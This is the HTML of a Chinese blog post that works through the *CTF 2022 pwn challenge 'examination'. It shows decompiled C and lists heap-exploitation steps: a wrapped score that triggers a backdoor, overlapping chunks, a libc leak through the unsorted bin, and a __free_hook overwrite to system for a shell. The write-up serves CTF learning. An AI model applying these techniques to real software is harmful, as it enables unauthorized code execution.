@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="周六的比赛题，看了一会没思路，直接开摆，现在看wp复现一下  参考链接：[*CTF 2022 pwn] examination  保护检查 保护全开，应该要修改hook了 IDA分析程序太长，就不一 一粘贴了，将函数功能整理如下 teacher: add_student: v2 &#x3D; calloc(1uLL, 0x20uLL);v3 &#x3D; calloc(1uLL, 0x18uLL);   增加一个学生">
+<meta property="og:type" content="article">
+<meta property="og:title" content="examination">
+<meta property="og:url" content="http://example.com/2022/04/18/examination/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="周六的比赛题，看了一会没思路，直接开摆，现在看wp复现一下  参考链接：[*CTF 2022 pwn] examination  保护检查 保护全开，应该要修改hook了 IDA分析程序太长，就不一 一粘贴了，将函数功能整理如下 teacher: add_student: v2 &#x3D; calloc(1uLL, 0x20uLL);v3 &#x3D; calloc(1uLL, 0x18uLL);   增加一个学生">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251696.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251697.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251698.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251699.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251700.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251701.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251702.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251704.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251705.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251706.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251707.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251708.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251709.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251711.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251712.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251714.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251715.png">
+<meta property="article:published_time" content="2022-04-18T07:51:00.504Z">
+<meta property="article:modified_time" content="2022-04-18T15:01:36.565Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251696.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>examination · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">examination</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                examination
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.4k</span>Reading time: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/04/18</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>周六的比赛题，看了一会没思路，直接开摆，现在看wp复现一下</p>
+<blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52640415/article/details/124231298?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165026668216780366558449%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165026668216780366558449&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-124231298.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&utm_term=*CTF+2022+&spm=1018.2226.3001.4187">[*CTF 2022 pwn] examination</a></p>
+</blockquote>
+<h3 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251696.png" alt="image-20220418155921368"></p>
+<p>保护全开，应该要修改hook了</p>
+<h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>程序太长，就不一 一粘贴了，将函数功能整理如下</p>
+<h4 id="teacher"><a href="#teacher" class="headerlink" title="teacher:"></a>teacher:</h4><ul>
+<li>add_student: <code>v2 = calloc(1uLL, 0x20uLL);v3 = calloc(1uLL, 0x18uLL);</code></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251697.png" alt="image-20220418162151739"></p>
+<p>增加一个学生</p>
+<p>管理块chunk :0x20,含指向成绩单的指针</p>
+<p>成绩单chunk：含有学生评级,成绩，以及评价指针，和评价长度</p>
+<p>评价   chunk ：这个块可以自定义</p>
+<ul>
+<li>give score</li>
+</ul>
+<p>给学生打分：<code>v2 = buf[0] % (10 * **qword_5080[i]);</code>,按学生评级(1-9)给每个学生打分，打分规则为 随机数%(评级*10),如果出去玩 -10</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(qword_5080[i] + <span class="number">24LL</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class="line">      v2 -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>write_review </li>
+</ul>
+<p>给学生写评语，增加评价chunk可自定义size 和 content，如果已存在则修改content</p>
+<ul>
+<li>call parents</li>
+</ul>
+<p>叫家长开除：free 掉该学生的所有chunk，并将指针置0</p>
+<ul>
+<li>change role</li>
+</ul>
+<p>切换学生老师</p>
+<h4 id="student："><a href="#student：" class="headerlink" title="student："></a>student：</h4><ul>
+<li>do_test</li>
+</ul>
+<p>没啥用</p>
+<ul>
+<li>check review</li>
+</ul>
+<p>显示评价，当学生超过89分（正常不可能，因为%90最大89）可以显示chunk地址并允许给任意地址加1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(*qword_5080[a1] + <span class="number">4LL</span>) &gt; <span class="number">0x59</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good Job! Here is your reward! %p\n&quot;</span>, qword_5080[a1]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>);</span><br><span class="line">      sub_13D5(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>);</span><br><span class="line">      v1 = atol(nptr);</span><br><span class="line">      ++*v1;</span><br><span class="line">      *(qword_5080[a1] + <span class="number">28LL</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pray</li>
+</ul>
+<p>出去玩。<code>*(qword_5080[a1] + 24LL) ^= 1u;</code></p>
+<ul>
+<li>set mode</li>
+</ul>
+<p>自己改分？</p>
+<ul>
+<li>change role</li>
+</ul>
+<p>切换教师学生身份</p>
+<ul>
+<li>change id</li>
+</ul>
+<p>切换学生编号</p>
+<p>需要解决的问题，如果需要泄露libc就要用到unsorted bin，但是最多只能创建7个学生，没法填满tcache，但是size 大于400即可释放到unsorted bin中</p>
+<p>漏洞：check review中，显然存在后门。它实现泄露地址和任意地址修改，但不可能有正常学生得到90分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">check_review</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( *(qword_5080[a1] + <span class="number">28LL</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;already gained the reward!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(*qword_5080[a1] + <span class="number">4LL</span>) &gt; <span class="number">0x59</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good Job! Here is your reward! %p\n&quot;</span>, qword_5080[a1]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>);</span><br><span class="line">      sub_13D5(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>);</span><br><span class="line">      v1 = atol(nptr);</span><br><span class="line">      ++*v1;</span><br><span class="line">      *(qword_5080[a1] + <span class="number">28LL</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(*qword_5080[a1] + <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;here is the review:&quot;</span>);</span><br><span class="line">      write(<span class="number">1</span>, *(*qword_5080[a1] + <span class="number">8LL</span>), *(*qword_5080[a1] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no reviewing yet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是怎么让分数超过89呢。这个教师评分模块有问题，当学生本来成绩就不高，再出去玩-10就会变成负分实现逆袭。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">give_score</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;marking testing papers.....&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; student_num; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">8uLL</span>) != <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read_error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[<span class="number">0</span>] &amp;= ~<span class="number">0x80</span>u;</span><br><span class="line">    v2 = buf[<span class="number">0</span>] % (<span class="number">10</span> * **qword_5080[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;score for the %dth student is %d\n&quot;</span>, i, v2);</span><br><span class="line">    <span class="keyword">if</span> ( *(qword_5080[i] + <span class="number">24LL</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;the student is lazy! b@d!&quot;</span>);</span><br><span class="line">      v2 -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(*qword_5080[i] + <span class="number">4LL</span>) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出去玩只需调用pray函数即可</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li>教师身份登录</li>
+<li>添加一个学生0，添加学生固定为学渣</li>
+<li>写评价（构造一个指定尺寸的chunk 0x380，回头修改他实现unsorted bin和重叠）</li>
+<li>添加第2个学生1</li>
+<li>给第2个学生写评语，将来第1个学生的评价扩大后覆盖到这里把unsort的main_arena指针挤到这，实现libc地址泄露，由于题目的libc版本是2.31对前后都有检查，所以学生0的评语块扩大后要正好能覆盖整个学生2，这里学生0的评语块头从0x391改为0x491时,学生1的评语块为0xa0）</li>
+<li>添加第3个学生用于分隔top_chunk</li>
+<li>切换到学生</li>
+<li>选择学生0</li>
+<li>出去玩</li>
+<li>切换回教师</li>
+<li>给学生评分（出现负分，溢出）</li>
+<li>切换回学生</li>
+<li>选择学生0</li>
+<li>看评语，这里执行后门显示堆地址，在这个地址0x49的偏移处加1（0x391的3改为4，大于0x410，释放时可进入unsorted bin，并连同学生1整个覆盖）</li>
+<li>切换回教师</li>
+<li>开除学生0</li>
+<li>添加学生0（从unsort中切出0x30+0x20)</li>
+<li>给学生2写评语0x388 ，这里由于分配块时用的都是calloc分配chunk，分配0x388 会从unsorted bin中切割，切割前unsorted bin的fd 和bk指向libc，而切割后unsorted bin的fd 和bk 也会指向libc，我们控制切割后的unsorted bin正好是student1 的评价 chunk，那么我们利用student1 的check_review，即可泄露出libc，因此这里会覆盖到student1 ，所以要恢复student 1的一些指针信息</li>
+<li>切回学生</li>
+<li>选择学生1</li>
+<li>显示评语，得到main_arena指针得到libc，大功基本完成，由于这里泄露了指针得到libc，而学生1的评语指针又是可控的，可以通过这个指针实现任意地址写。j将写__free_hook为system实现getshell</li>
+<li>切换回教师</li>
+<li>修改学生2的评语（重写学生1结构，将指向评语的指针改为__free_hook，并同时预存一个/bin/sh\00)</li>
+<li>修改学生1的评语(在__free_hook写system）</li>
+<li>开除学生2得到shell</li>
+</ol>
+<p>首先先创建学生0（评论块0x380），学生1（评论块0xa0），学生2（分割top chunk）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251698.png" alt="image-20220418172345932"></p>
+<p>然后切换学生0，执行pray函数，发现成绩单chunk中成绩已经溢出为一个很大的数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251699.png" alt="image-20220418174035090"></p>
+<p>然后切换为学生0，调用check_review函数，这里执行后门显示堆地址，在这个地址0x49的偏移处加1（0x391的3改为4，大于0x410释放时可进入unsorted bin，并连同学生1整个覆盖）</p>
+<p>泄露的基址为student0 管理块chunk 的user data<img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251700.png" alt="image-20220418195806877"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251701.png" alt="image-20220418224525898"></p>
+<p>修改student0的评价chunk 前</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251702.png" alt="image-20220418182251694"></p>
